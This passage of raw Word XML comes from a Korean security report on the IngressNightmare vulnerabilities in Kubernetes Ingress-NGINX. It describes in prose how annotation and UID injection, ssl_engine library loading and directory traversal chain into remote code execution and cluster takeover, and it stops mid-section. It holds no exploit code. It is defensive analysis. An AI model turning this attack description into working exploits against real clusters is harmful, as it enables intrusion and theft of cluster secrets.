    <w:p w14:paraId="59C6E43C" w14:textId="7231282C" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="104"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Datadog, Dynatrace, Splunk 등 클라우드 보안 플랫폼을 연동해, 컨테이너 내 쉘 생성, 비인가 프로세스 실행, 의심스러운 네트워크 트래픽 등을 실시간으로 탐지할 수 있습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4361827E" w14:textId="697EA498" w:rsidR="00E27F85" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="104"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">예를 들어, Datadog의 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>eBPF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 기반 탐지 기능은 ingress-nginx 컨테이너 내에서 발생하는 post-exploitation 행위를 자동으로 식별합니다.</w:t>
      </w:r>
      <w:r w:rsidR="00B854B5">
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED80640" w14:textId="032B42B8" w:rsidR="00E27F85" w:rsidRPr="00BA5E73" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA5E73">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">9. </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>유사</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>연관</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>벡터</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E05DA09" w14:textId="78DDA8E3" w:rsidR="00BA5E73" w:rsidRPr="00BA5E73" w:rsidRDefault="00BA5E73" w:rsidP="00BA5E73">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA5E73">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">9.1 </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">CVE-2025-1974, CVE-2025-24513 </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>등</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4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proofErr w:type="spellStart"/>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>IngressNightmare</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4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6E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>시리즈</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4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6E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>개요</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17CC6A33" w14:textId="446C0AE5" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>IngressNightmare</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>는 2025년 3월 공개된 Kubernetes Ingress-NGINX Controller의 치명적 취약점 묶음으로, 네트워크 노출 및 권한 상승을 통해 클러스터 전체 장악이 가능한 구조적 위협을 의미합니다.</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>주요 취약점은 다음과 같습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1812EC23" w14:textId="0764AF64" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="105"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>CVE-2025-1974</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>가장 심각한 취약점으로, 인증되지 않은 공격자가 Pod 네트워크 접근만으로 Admission Controller에 악성 Ingress 객체를 전송해 임의의 NGINX directive를 주입할 수 있습니다.</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>이때 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>ssl_engine</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 등 특수 directive를 활용해 악성 라이브러리를 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>로드하면</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>, admission controller 컨텍스트에서 원격 코드 실행(RCE)이 가능합니다.</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>기본 설정에서는 admission controller가 클러스터 전체 Secrets에 접근할 수 있어, 단일 공격으로 전체 클러스터 장악이 가능합니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F9CABD" w14:textId="7B31212F" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="105"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>CVE-2025-24513</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Admission Controller가 사용자 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>입력값을</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 파일명에 직접 반영하는 과정에서 발생하는 디렉터리 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>트래버설</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 취약점입니다. 단독으로는 DoS 및 일부 Secret 유출에 그치지만, 다른 취약점과 조합 시 영향이 확대될 수 있습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E38E34" w14:textId="6B7E1D55" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="105"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>CVE-2025-24514, CVE-2025-1097, CVE-2025-1098</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">모두 NGINX 설정 파일에 annotation, UID 등 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>입력값이</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 적절히 검증되지 않은 채 삽입되는 injection 취약점입니다.</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">공격자는 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>개행</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 문자, 세미콜론, NGINX directive 등을 annotation/UID에 삽입해 악성 설정을 주입할 수 있습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D316B0" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이들 취약점은 단독 또는 조합으로 악용될 수 있으며, 실제로는 injection 취약점(CVE-2025-24514 등)으로 악성 directive를 주입한 뒤, CVE-2025-1974를 통해 코드 실행 및 권한 상승까지 이어지는 체인 공격이 가능합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53033DA4" w14:textId="017D7098" w:rsidR="00BA5E73" w:rsidRPr="00BA5E73" w:rsidRDefault="00BA5E73" w:rsidP="00BA5E73">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA5E73">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">9.2 </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">NGINX directive injection, admission webhook </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>기법</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A40143B" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>NGINX Directive Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07552382" w14:textId="70CB5913" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격 원리</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Ingress-NGINX Controller가 Ingress annotation, UID 등 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>입력값을</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> NGINX 설정 파일에 삽입할 때, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>입력값</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
